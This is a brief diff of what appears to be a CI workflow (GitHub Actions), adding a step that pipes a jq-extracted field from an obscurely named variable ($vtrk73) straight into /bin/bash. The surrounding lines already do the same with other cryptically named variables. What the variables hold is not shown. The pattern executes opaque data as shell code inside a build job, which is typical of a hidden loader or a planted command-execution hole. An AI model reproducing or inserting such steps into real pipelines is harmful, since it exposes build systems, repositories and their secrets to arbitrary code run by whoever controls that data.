@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$ldaq8" | jq -r .azx0 | /bin/bash
           echo $hw6 | jq -r .bcjc04634 | /bin/bash
           printf '%s' "$m000" | jq -r .ff07 | /bin/bash
+          echo $vtrk73 | jq -r .f515 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
